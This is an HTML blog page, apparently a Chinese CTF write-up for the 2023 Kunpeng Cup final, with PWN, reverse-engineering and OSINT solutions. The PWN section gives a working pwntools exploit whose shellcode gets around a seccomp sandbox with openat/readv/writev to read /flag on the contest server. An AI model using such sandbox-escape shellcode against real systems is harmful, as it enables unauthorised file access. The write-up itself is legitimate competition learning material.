@@ -1,0 +1,119 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="鲲鹏杯2023决赛">
+<meta property="og:type" content="article">
+<meta property="og:title" content="KPCTF">
+<meta property="og:url" content="https://wulala11.github.io/2023/09/24/KPCTF/index.html">
+<meta property="og:site_name" content="The Sun Also Rises">
+<meta property="og:description" content="鲲鹏杯2023决赛">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wulala11.github.io/2023/09/24/KPCTF/21.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/09/24/KPCTF/22.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/09/24/KPCTF/23.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/09/24/KPCTF/28.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/09/24/KPCTF/24.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/09/24/KPCTF/25.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/09/24/KPCTF/26.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/09/24/KPCTF/27.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/09/24/KPCTF/29.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/09/24/KPCTF/30.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/09/24/KPCTF/31.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/09/24/KPCTF/32.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/09/24/KPCTF/33.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/09/24/KPCTF/34.png">
+<meta property="article:published_time" content="2023-09-24T03:36:06.000Z">
+<meta property="article:modified_time" content="2023-09-24T07:22:33.753Z">
+<meta property="article:author" content="wulala">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wulala11.github.io/2023/09/24/KPCTF/21.png"><title>KPCTF | The Sun Also Rises</title><link ref="canonical" href="https://wulala11.github.io/2023/09/24/KPCTF/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: undefined,
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"carbon","highlight":"dark","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/ctf/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/ctf/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">KPCTF</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-09-24</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-09-24</span></span></div></header><div class="post-body">
+        <h1 id="PWN"   >
+          <a href="#PWN" class="heading-link"><i class="fas fa-link"></i></a><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1>
+      
+        <h2 id="time-will-tell-you"   >
+          <a href="#time-will-tell-you" class="heading-link"><i class="fas fa-link"></i></a><a href="#time-will-tell-you" class="headerlink" title="time will tell you"></a>time will tell you</h2>
+      <p>拿到附件，先查保护，保护全开。</p>
+<img src="/2023/09/24/KPCTF/21.png" class="">
+<p>保护全开。<br>ida打开附件，大概内容是输入字符串kokodayo,经过sandbox后，程序留跳转到kokodayo。</p>
+<img src="/2023/09/24/KPCTF/22.png" class="">
+<p>sandbox是一个沙箱，38号和22号。seccomp-tools查一下沙箱。</p>
+<img src="/2023/09/24/KPCTF/23.png" class="">
+<p>禁用了write，open，execve，execveat.<br>open系统调用实际上是调用了openat， read，write系统调用也同样是调用了readv，和writev。<br>所以直接orw就行<br>exp</p>
+<figure class="highlight py"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./a&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;47.122.60.49&#x27;</span>,<span class="number">20027</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.openat(<span class="number">0</span>,<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.readv(<span class="number">3</span>,<span class="number">0x10110</span>,<span class="number">1</span>)</span><br><span class="line">shellcode += shellcraft.writev(<span class="number">1</span>,<span class="number">0x10110</span>,<span class="number">1</span>)</span><br><span class="line">payload = asm(shellcode).ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/flag\x00&#x27;</span>.ljust(<span class="number">16</span>, <span class="string">b&#x27;\x00&#x27;</span>)+ flat(<span class="number">0x10200</span>, <span class="number">0x100</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+<img src="/2023/09/24/KPCTF/28.png" class="">
+<p>##我是非预期解出的，询问出题人得知，原本是想把write，writev，pwritev，pwritev2全部禁用，让flag打印不出来，不过writev漏了，所以省了侧信道爆破字符的过程。##</p>
+
+        <h1 id="REVERSE"   >
+          <a href="#REVERSE" class="heading-link"><i class="fas fa-link"></i></a><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1>
+      
+        <h2 id="简单明了的源码lv1"   >
+          <a href="#简单明了的源码lv1" class="heading-link"><i class="fas fa-link"></i></a><a href="#简单明了的源码lv1" class="headerlink" title="简单明了的源码lv1"></a>简单明了的源码lv1</h2>
+      <p>看源码，main函数执行后跳转到e这个函数e这个函数里面有四个过程，大概内容是<br>输入字符串后<br>1.将字符串前五位与flag{比较，不相同跳转到d()<br>    <code>if c[:5].encode().hex() != &#39;&#123;0&#125;&#123;0&#125;&#123;0&#125;c&#123;0&#125;1&#123;0&#125;&#123;2&#125;&#123;2&#125;b&#39;.format(*map(str, [6, 4, 7])):         d()  #flag&#123;</code><br>2.将字符串最后一位与}比较，不相同跳转到d()<br><code>    if c[int(chr(45) + chr(49))] != chr(125):         d()   #&#125;</code><br>3.将字符串第六位和倒数第二位与斐波那契数列进行异或，与目标字符串(f)进行比较，不相同跳转到d()<br><code>        g = c[5:-1].encode()         if bytes((g[i] ^ (a(i) &amp; 0xff) for i in range(len(g)))) != f:             d()</code></p>
+<p>所以现在只需要写一个脚本将f与斐波那契数列进行异或,将得到的字符串与flag{}拼接，就能拿到flag.<br>exp</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned char i123[] = &#123;</span><br><span class="line">  2,1,3,4,7,11,18,29,47,76,123,199,66,9,75,84,159,243,146,133,23,156,179,79,2,81,83,164,247,155,146,45</span><br><span class="line">  &#125;;</span><br><span class="line">  unsigned char i321[] = &#123;</span><br><span class="line">  &#x27;3&#x27;,&#x27;&amp;&#x27;, &#x27;`&#x27;,&#x27;[&#x27;,&#x27;u&#x27;,&#x27;j&#x27;,&#x27;&#123;&#x27;,&#x27;i&#x27;,&#x27;J&#x27;,0x13,0x1d,0xa2,&#x27;.&#x27;,&#x27;h&#x27;,&#x27;&quot;&#x27;,&#x27;3&#x27;,0xfa,0xac,0xe5,0xe0,&#x27;~&#x27;,0xf9,0xc1,&#x27;$&#x27;,&#x27;g&#x27;, &#x27;?&#x27;,0x0c,0xd0,0x82,0xc4,0xc0,&#x27;h&#x27;</span><br><span class="line">  &#125;;</span><br><span class="line">  int i;</span><br><span class="line">  for (i = 0; i &lt; 32; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    i123[i] ^= i321[i];</span><br><span class="line">    printf(&quot;%c&quot;, i123[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<img src="/2023/09/24/KPCTF/24.png" class="">
+
+
+        <h2 id="FlagCheck"   >
+          <a href="#FlagCheck" class="heading-link"><i class="fas fa-link"></i></a><a href="#FlagCheck" class="headerlink" title="FlagCheck"></a>FlagCheck</h2>
+      <img src="/2023/09/24/KPCTF/25.png" class="">
+<p>打开附件，看不懂java，将红框的这两个类拿去拷打ai.直接得到exp.</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def decStr(enc_str, row):</span><br><span class="line">    alphaBet = &quot;qwertyuiopasdfghjklzxcvbnm&quot;</span><br><span class="line">    initAlphaBet = alphaBet</span><br><span class="line">    alphaBet = setAlphaBet(alphaBet, row)</span><br><span class="line">    dec_str = &quot;&quot;</span><br><span class="line">    for i in range(len(enc_str) // 2):</span><br><span class="line">        char_hex = enc_str[i * 2: (i + 1) * 2]</span><br><span class="line">        char_dec = int(char_hex, 16) ^ 0x76</span><br><span class="line">        if chr(char_dec).islower():</span><br><span class="line">            char_index = alphaBet.index(chr(char_dec))</span><br><span class="line">            dec_str += chr(char_index + 97)</span><br><span class="line">        elif chr(char_dec).isupper():</span><br><span class="line">            char_index = alphaBet.index(chr(char_dec).lower())</span><br><span class="line">            dec_str += chr(char_index + 65)</span><br><span class="line">        else:</span><br><span class="line">            dec_str += chr(char_dec)</span><br><span class="line">    return dec_str[::-1]</span><br><span class="line"></span><br><span class="line">def setAlphaBet(alphaBet, row):</span><br><span class="line">    if alphaBet and len(alphaBet) &gt; row:</span><br><span class="line">        alphaBet = alphaBet[row:] + alphaBet[:row]</span><br><span class="line">    return alphaBet</span><br><span class="line"></span><br><span class="line">enc_str = &quot;0b0542353e413229223e363e29180429110046121545030d1c17151e&quot;</span><br><span class="line">row = 114514</span><br><span class="line">dec_str = decStr(enc_str, row)</span><br><span class="line">print(dec_str)</span><br></pre></td></tr></table></div></figure>
+<img src="/2023/09/24/KPCTF/26.png" class="">
+<p>代码运行后得到一串字符串，看起来像凯撒密码，试了一下果然是。</p>
+<img src="/2023/09/24/KPCTF/27.png" class="">
+
+
+        <h2 id="简单明了的源码lv2"   >
+          <a href="#简单明了的源码lv2" class="heading-link"><i class="fas fa-link"></i></a><a href="#简单明了的源码lv2" class="headerlink" title="简单明了的源码lv2"></a>简单明了的源码lv2</h2>
+      <p>这题折磨了好久，在苦苦挣扎2小时后灵光一现…</p>
+<p>附件里面有一个flag.py,flag.txt和makeflag的pyc文件，makeflag的魔法头完整 ，直接拉入pycdc反编译，得到makeflag.py</p>
+<img src="/2023/09/24/KPCTF/29.png" class="">
+<p>大概意思是生成一个uuid4字符串和flag{}拼接，然后获取当前时间为随机种子，将字符串随机打乱100次，再写入flag.txt中。所以附件中的flag.txt就是flag被打乱后的结果。<br>uuid4是完全随机的，没有办法入手，但是时间种子可以从pyc文件中拿到，pyc文件前4字节是magichead,第8字节到第12字节是时间戳，记录了文件的创建和写入时间。</p>
+<img src="/2023/09/24/KPCTF/30.png" class="">
+<p>所以直接将系统时间改到文件创建时间的同一时刻，得到的随机种子便是相同的。</p>
+<img src="/2023/09/24/KPCTF/31.png" class="">
+<p>将系统改到2023.9.10 17:30:59后，运行flag.py，拿到被同样时间种子打乱的不同uuid4字符串。(右上为我的uuid4码，左上为我的被打乱的uuid4码，左下为题目给的被打乱的uuid4码)</p>
+<img src="/2023/09/24/KPCTF/32.png" class="">
+<p>冒泡排序，将我的打乱uuid4码冒泡排序成未被打乱的。并按照相同的冒泡顺序来整理题目所给的被打乱的uuid4码，提交flag后错误了，反应过来我的uuid4码中有多个相同的字符，所以我的uuid4排序完成后，题目的uuid4按照我这个顺序来排序并不能真正做到排序。<br>想了很久，我排序出问题的原因是因为uuid4生成的字符串中会有相同的字符，所以只需要手动输入一个与生成字符串长度相同并且没有重复字符的字符串与flag{}拼接，就能完美还原打乱100次前的状态。</p>
+<img src="/2023/09/24/KPCTF/33.png" class="">
+<p>修改makeflag.py，将uuid4换成了a[]=1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ。运行flag.py.</p>
+<img src="/2023/09/24/KPCTF/34.png" class="">
+<p>左上为flag{a}被打乱的结果，右上为flag{a}，左下为题目的uuid4被打乱的结果，把左下根据每个字符串一一对应的位置还原，得到右下的flag.</p>
+
+        <h1 id="OSINT"   >
+          <a href="#OSINT" class="heading-link"><i class="fas fa-link"></i></a><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1>
+      
+        <h2 id="快乐假期"   >
+          <a href="#快乐假期" class="heading-link"><i class="fas fa-link"></i></a><a href="#快乐假期" class="headerlink" title="快乐假期"></a>快乐假期</h2>
+      <p>Q1:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.t3sec.org.com_梁厝站/" >www.t3sec.org.com_梁厝站</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 比赛是铁三，导航从会场到可以直达森林公园的站点知道是梁厝站<br>Q2:象峰站_132路    f口出去就是车站，符合条件的只有象峰站,到北门的公交车132路<br>Q3:三盛国际公园_新厝站   坐两站，符合条件的是三盛国际公园 导航得知新厝站 </p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-share"><div class="social-share" data-sites="qzone, qq, weibo, wechat, douban, linkedin, facebook, twitter, google">Share to: </div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2023/09/20/kunpeng2023/"><span class="paginator-prev__text">kunpeng2023</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">1.</span> <span class="toc-text">
+          PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#time-will-tell-you"><span class="toc-number">1.1.</span> <span class="toc-text">
+          time will tell you</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REVERSE"><span class="toc-number">2.</span> <span class="toc-text">
+          REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%98%8E%E4%BA%86%E7%9A%84%E6%BA%90%E7%A0%81lv1"><span class="toc-number">2.1.</span> <span class="toc-text">
+          简单明了的源码lv1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FlagCheck"><span class="toc-number">2.2.</span> <span class="toc-text">
+          FlagCheck</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%98%8E%E4%BA%86%E7%9A%84%E6%BA%90%E7%A0%81lv2"><span class="toc-number">2.3.</span> <span class="toc-text">
+          简单明了的源码lv2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OSINT"><span class="toc-number">3.</span> <span class="toc-text">
+          OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BF%AB%E4%B9%90%E5%81%87%E6%9C%9F"><span class="toc-number">3.1.</span> <span class="toc-text">
+          快乐假期</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/1.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">wulala11</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="1802399119" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">18</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/ctf/"><div class="sidebar-ov-state-item__count">1</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/ctf/"><div class="sidebar-ov-state-item__count">2</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script></body></html>
